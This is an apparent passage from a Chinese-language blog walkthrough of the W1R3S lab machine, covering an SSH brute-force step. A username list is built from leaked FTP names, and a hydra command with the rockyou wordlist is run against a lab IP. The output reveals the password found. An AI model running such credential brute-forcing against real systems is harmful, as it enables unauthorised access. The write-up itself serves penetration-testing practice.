</span></span></span><span class=line><span class=cl><span class=s2>              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \ 
</span></span></span><span class=line><span class=cl><span class=s2>               \        /  |   ||    |   \/       \/        \
</span></span></span><span class=line><span class=cl><span class=s2>                \__/\  /   |___||____|_  /______  /_______  /.INC
</span></span></span><span class=line><span class=cl><span class=s2>                     \/                \/       \/        \/        CHALLENGE, V 1.0
</span></span></span><span class=line><span class=cl><span class=s2>----------------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>CREATED BY SpecterWires
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>----------------------------------------------------------------------------------------
</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>‍</p>
<h2 id=ssh-暴力破解><a href=#ssh-暴力破解 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:ssh-暴力破解 class=headings>SSH 暴力破解</a></h2>
<p>构造用户字典这里的用户字典需要结合 <code>FTP</code> 泄露信息来构造：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;&#39;&#39;w1r3s
</span></span></span><span class=line><span class=cl><span class=s1>admin
</span></span></span><span class=line><span class=cl><span class=s1>root
</span></span></span><span class=line><span class=cl><span class=s1>naomi
</span></span></span><span class=line><span class=cl><span class=s1>hector
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span> &gt; user.list
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>使用 <code>hydra</code> 对 <code>SSH</code> 暴力破解：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># -L 指定用户名</span>
</span></span><span class=line><span class=cl><span class=c1># -P 指定字典</span>
</span></span><span class=line><span class=cl><span class=c1># -t 4 用四线程的方式破解</span>
</span></span><span class=line><span class=cl>$ hydra -L user.list -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.130 -t <span class=m>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hydra v9.5 <span class=o>(</span>c<span class=o>)</span> <span class=m>2023</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2024-03-28 10:39:27
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>4</span> tasks per <span class=m>1</span> server, overall <span class=m>4</span> tasks, <span class=m>86066394</span> login tries <span class=o>(</span>l:6/p:14344399<span class=o>)</span>, ~21516599 tries per task
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking ssh://10.10.10.130:22/
</span></span><span class=line><span class=cl><span class=o>[</span>STATUS<span class=o>]</span> 44.00 tries/min, <span class=m>44</span> tries in 00:01h, <span class=m>86066350</span> to <span class=k>do</span> in 32600:54h, <span class=m>4</span> active
</span></span><span class=line><span class=cl><span class=o>[</span>22<span class=o>][</span>ssh<span class=o>]</span> host: 10.10.10.130   login: w1r3s   password: computer
</span></span><span class=line><span class=cl><span class=o>[</span>STATUS<span class=o>]</span> 4781475.00 tries/min, <span class=m>14344425</span> tries in 00:03h, <span class=m>71721969</span> to <span class=k>do</span> in 00:15h, <span class=m>4</span> active
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>密码破解成功。</p>
</div>
</article>
<footer class=minimal-footer>
<div class=post-tag><a href=/tags/%E9%9D%B6%E6%9C%BA/ rel=tag class=post-tag-link>#靶机</a> <a href=/tags/target/ rel=tag class=post-tag-link>#target</a></div>
<div class=post-category>
<a href=/tech/ class="post-category-link active">tech</a>
</div>
</footer>
</div>
</main>
<div id=back-to-top class=back-to-top>
<a href=#><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6.0-33.9L207 39c9.4-9.4 24.6-9.4 33.9.0l194.3 194.3c9.4 9.4 9.4 24.6.0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3.0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
</div>
</div>
<script src=https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js></script>
<script>let imgNodes=document.querySelectorAll("div.post-body img");imgNodes=Array.from(imgNodes).filter(e=>e.parentNode.tagName!=="A"),mediumZoom(imgNodes,{background:"hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)"})</script>
<script src=https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js type=module defer></script>
</body>
</html>